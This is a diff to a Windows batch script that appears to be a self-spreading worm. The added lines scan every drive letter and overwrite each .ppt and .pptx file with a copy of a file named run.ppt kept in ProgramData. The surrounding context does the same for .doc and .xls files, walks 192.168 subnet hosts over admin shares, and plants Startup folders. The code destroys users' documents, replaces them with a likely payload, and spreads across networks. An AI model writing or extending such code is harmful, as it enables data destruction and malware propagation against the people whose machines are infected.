@@ -147,6 +147,52 @@ if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /b') do copy /Y "C:\Program
 for /R "Y:" %%f in (*.xlsx) do ren "%%f" *.xls)
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h"
 for /R "Z:" %%f in (*.xlsx) do ren "%%f" *.xls)
+if exist D: (for /f "delims=" %%h in ('dir D:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "D:\%%h"
+for /R "D:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist E: (for /f "delims=" %%h in ('dir E:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "E:\%%h"
+for /R "E:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist F: (for /f "delims=" %%h in ('dir F:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "F:\%%h"
+for /R "F:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist G: (for /f "delims=" %%h in ('dir G:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "G:\%%h"
+for /R "G:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist H: (for /f "delims=" %%h in ('dir H:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "H:\%%h"
+for /R "H:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist I: (for /f "delims=" %%h in ('dir I:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "I:\%%h"
+for /R "I:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist J: (for /f "delims=" %%h in ('dir J:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "J:\%%h"
+for /R "J:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist K: (for /f "delims=" %%h in ('dir K:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "K:\%%h"
+for /R "K:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist L: (for /f "delims=" %%h in ('dir L:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "L:\%%h"
+for /R "L:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist M: (for /f "delims=" %%h in ('dir M:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "M:\%%h"
+for /R "M:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist N: (for /f "delims=" %%h in ('dir N:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "N:\%%h"
+for /R "N:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist O: (for /f "delims=" %%h in ('dir O:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "O:\%%h"
+for /R "O:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist P: (for /f "delims=" %%h in ('dir P:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "P:\%%h"
+for /R "P:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Q:\%%h"
+for /R "Q:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist R: (for /f "delims=" %%h in ('dir R:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "R:\%%h"
+for /R "R:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist S: (for /f "delims=" %%h in ('dir S:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "S:\%%h"
+for /R "S:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist T: (for /f "delims=" %%h in ('dir T:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "T:\%%h"
+for /R "T:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist U: (for /f "delims=" %%h in ('dir U:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "U:\%%h"
+for /R "U:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist V: (for /f "delims=" %%h in ('dir V:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "V:\%%h"
+for /R "V:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist W: (for /f "delims=" %%h in ('dir W:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "W:\%%h"
+for /R "W:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "X:\%%h"
+for /R "X:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Y:\%%h"
+for /R "Y:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Z:\%%h"
+for /R "Z:" %%f in (*.pptx) do ren "%%f" *.ppt)
 
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
@@ -194,6 +240,29 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xls /b') do copy /Y "C:\ProgramD
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "X:\%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Y:\%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h")
+if exist D: (for /f "delims=" %%h in ('dir D:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "D:\%%h")
+if exist E: (for /f "delims=" %%h in ('dir E:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "E:\%%h")
+if exist F: (for /f "delims=" %%h in ('dir F:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "F:\%%h")
+if exist G: (for /f "delims=" %%h in ('dir G:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "G:\%%h")
+if exist H: (for /f "delims=" %%h in ('dir H:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "H:\%%h")
+if exist I: (for /f "delims=" %%h in ('dir I:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "I:\%%h")
+if exist J: (for /f "delims=" %%h in ('dir J:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "J:\%%h")
+if exist K: (for /f "delims=" %%h in ('dir K:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "K:\%%h")
+if exist L: (for /f "delims=" %%h in ('dir L:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "L:\%%h")
+if exist M: (for /f "delims=" %%h in ('dir M:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "M:\%%h")
+if exist N: (for /f "delims=" %%h in ('dir N:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "N:\%%h")
+if exist O: (for /f "delims=" %%h in ('dir O:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "O:\%%h")
+if exist P: (for /f "delims=" %%h in ('dir P:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "P:\%%h")
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Q:\%%h")
+if exist R: (for /f "delims=" %%h in ('dir R:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "R:\%%h")
+if exist S: (for /f "delims=" %%h in ('dir S:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "S:\%%h")
+if exist T: (for /f "delims=" %%h in ('dir T:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "T:\%%h")
+if exist U: (for /f "delims=" %%h in ('dir U:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "U:\%%h")
+if exist V: (for /f "delims=" %%h in ('dir V:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "V:\%%h")
+if exist W: (for /f "delims=" %%h in ('dir W:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "W:\%%h")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "X:\%%h")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Y:\%%h")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Z:\%%h")
 
 for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -341,6 +410,52 @@ if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /b') do copy /Y "C:\Program
 for /R "Y:" %%f in (*.xlsx) do ren "%%f" *.xls)
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h"
 for /R "Z:" %%f in (*.xlsx) do ren "%%f" *.xls)
+if exist D: (for /f "delims=" %%h in ('dir D:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "D:\%%h"
+for /R "D:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist E: (for /f "delims=" %%h in ('dir E:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "E:\%%h"
+for /R "E:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist F: (for /f "delims=" %%h in ('dir F:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "F:\%%h"
+for /R "F:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist G: (for /f "delims=" %%h in ('dir G:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "G:\%%h"
+for /R "G:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist H: (for /f "delims=" %%h in ('dir H:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "H:\%%h"
+for /R "H:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist I: (for /f "delims=" %%h in ('dir I:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "I:\%%h"
+for /R "I:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist J: (for /f "delims=" %%h in ('dir J:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "J:\%%h"
+for /R "J:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist K: (for /f "delims=" %%h in ('dir K:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "K:\%%h"
+for /R "K:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist L: (for /f "delims=" %%h in ('dir L:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "L:\%%h"
+for /R "L:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist M: (for /f "delims=" %%h in ('dir M:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "M:\%%h"
+for /R "M:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist N: (for /f "delims=" %%h in ('dir N:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "N:\%%h"
+for /R "N:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist O: (for /f "delims=" %%h in ('dir O:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "O:\%%h"
+for /R "O:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist P: (for /f "delims=" %%h in ('dir P:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "P:\%%h"
+for /R "P:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Q:\%%h"
+for /R "Q:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist R: (for /f "delims=" %%h in ('dir R:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "R:\%%h"
+for /R "R:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist S: (for /f "delims=" %%h in ('dir S:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "S:\%%h"
+for /R "S:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist T: (for /f "delims=" %%h in ('dir T:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "T:\%%h"
+for /R "T:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist U: (for /f "delims=" %%h in ('dir U:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "U:\%%h"
+for /R "U:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist V: (for /f "delims=" %%h in ('dir V:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "V:\%%h"
+for /R "V:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist W: (for /f "delims=" %%h in ('dir W:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "W:\%%h"
+for /R "W:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "X:\%%h"
+for /R "X:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Y:\%%h"
+for /R "Y:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Z:\%%h"
+for /R "Z:" %%f in (*.pptx) do ren "%%f" *.ppt)
 
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
@@ -388,6 +503,29 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xls /b') do copy /Y "C:\ProgramD
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "X:\%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Y:\%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h")
+if exist D: (for /f "delims=" %%h in ('dir D:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "D:\%%h")
+if exist E: (for /f "delims=" %%h in ('dir E:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "E:\%%h")
+if exist F: (for /f "delims=" %%h in ('dir F:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "F:\%%h")
+if exist G: (for /f "delims=" %%h in ('dir G:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "G:\%%h")
+if exist H: (for /f "delims=" %%h in ('dir H:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "H:\%%h")
+if exist I: (for /f "delims=" %%h in ('dir I:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "I:\%%h")
+if exist J: (for /f "delims=" %%h in ('dir J:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "J:\%%h")
+if exist K: (for /f "delims=" %%h in ('dir K:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "K:\%%h")
+if exist L: (for /f "delims=" %%h in ('dir L:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "L:\%%h")
+if exist M: (for /f "delims=" %%h in ('dir M:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "M:\%%h")
+if exist N: (for /f "delims=" %%h in ('dir N:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "N:\%%h")
+if exist O: (for /f "delims=" %%h in ('dir O:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "O:\%%h")
+if exist P: (for /f "delims=" %%h in ('dir P:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "P:\%%h")
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Q:\%%h")
+if exist R: (for /f "delims=" %%h in ('dir R:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "R:\%%h")
+if exist S: (for /f "delims=" %%h in ('dir S:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "S:\%%h")
+if exist T: (for /f "delims=" %%h in ('dir T:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "T:\%%h")
+if exist U: (for /f "delims=" %%h in ('dir U:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "U:\%%h")
+if exist V: (for /f "delims=" %%h in ('dir V:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "V:\%%h")
+if exist W: (for /f "delims=" %%h in ('dir W:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "W:\%%h")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "X:\%%h")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Y:\%%h")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Z:\%%h")
 
 pushd \\192.168.%i%.%ii%\C$
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -535,6 +673,52 @@ if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /b') do copy /Y "C:\Program
 for /R "Y:" %%f in (*.xlsx) do ren "%%f" *.xls)
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h"
 for /R "Z:" %%f in (*.xlsx) do ren "%%f" *.xls)
+if exist D: (for /f "delims=" %%h in ('dir D:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "D:\%%h"
+for /R "D:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist E: (for /f "delims=" %%h in ('dir E:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "E:\%%h"
+for /R "E:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist F: (for /f "delims=" %%h in ('dir F:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "F:\%%h"
+for /R "F:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist G: (for /f "delims=" %%h in ('dir G:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "G:\%%h"
+for /R "G:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist H: (for /f "delims=" %%h in ('dir H:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "H:\%%h"
+for /R "H:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist I: (for /f "delims=" %%h in ('dir I:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "I:\%%h"
+for /R "I:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist J: (for /f "delims=" %%h in ('dir J:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "J:\%%h"
+for /R "J:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist K: (for /f "delims=" %%h in ('dir K:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "K:\%%h"
+for /R "K:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist L: (for /f "delims=" %%h in ('dir L:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "L:\%%h"
+for /R "L:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist M: (for /f "delims=" %%h in ('dir M:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "M:\%%h"
+for /R "M:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist N: (for /f "delims=" %%h in ('dir N:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "N:\%%h"
+for /R "N:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist O: (for /f "delims=" %%h in ('dir O:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "O:\%%h"
+for /R "O:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist P: (for /f "delims=" %%h in ('dir P:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "P:\%%h"
+for /R "P:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Q:\%%h"
+for /R "Q:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist R: (for /f "delims=" %%h in ('dir R:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "R:\%%h"
+for /R "R:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist S: (for /f "delims=" %%h in ('dir S:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "S:\%%h"
+for /R "S:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist T: (for /f "delims=" %%h in ('dir T:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "T:\%%h"
+for /R "T:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist U: (for /f "delims=" %%h in ('dir U:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "U:\%%h"
+for /R "U:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist V: (for /f "delims=" %%h in ('dir V:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "V:\%%h"
+for /R "V:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist W: (for /f "delims=" %%h in ('dir W:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "W:\%%h"
+for /R "W:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "X:\%%h"
+for /R "X:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Y:\%%h"
+for /R "Y:" %%f in (*.pptx) do ren "%%f" *.ppt)
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Z:\%%h"
+for /R "Z:" %%f in (*.pptx) do ren "%%f" *.ppt)
 
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
@@ -582,6 +766,29 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xls /b') do copy /Y "C:\ProgramD
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "X:\%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Y:\%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h")
+if exist D: (for /f "delims=" %%h in ('dir D:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "D:\%%h")
+if exist E: (for /f "delims=" %%h in ('dir E:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "E:\%%h")
+if exist F: (for /f "delims=" %%h in ('dir F:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "F:\%%h")
+if exist G: (for /f "delims=" %%h in ('dir G:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "G:\%%h")
+if exist H: (for /f "delims=" %%h in ('dir H:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "H:\%%h")
+if exist I: (for /f "delims=" %%h in ('dir I:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "I:\%%h")
+if exist J: (for /f "delims=" %%h in ('dir J:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "J:\%%h")
+if exist K: (for /f "delims=" %%h in ('dir K:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "K:\%%h")
+if exist L: (for /f "delims=" %%h in ('dir L:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "L:\%%h")
+if exist M: (for /f "delims=" %%h in ('dir M:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "M:\%%h")
+if exist N: (for /f "delims=" %%h in ('dir N:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "N:\%%h")
+if exist O: (for /f "delims=" %%h in ('dir O:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "O:\%%h")
+if exist P: (for /f "delims=" %%h in ('dir P:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "P:\%%h")
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Q:\%%h")
+if exist R: (for /f "delims=" %%h in ('dir R:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "R:\%%h")
+if exist S: (for /f "delims=" %%h in ('dir S:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "S:\%%h")
+if exist T: (for /f "delims=" %%h in ('dir T:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "T:\%%h")
+if exist U: (for /f "delims=" %%h in ('dir U:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "U:\%%h")
+if exist V: (for /f "delims=" %%h in ('dir V:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "V:\%%h")
+if exist W: (for /f "delims=" %%h in ('dir W:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "W:\%%h")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "X:\%%h")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Y:\%%h")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.ppt /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "Z:\%%h")
 
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
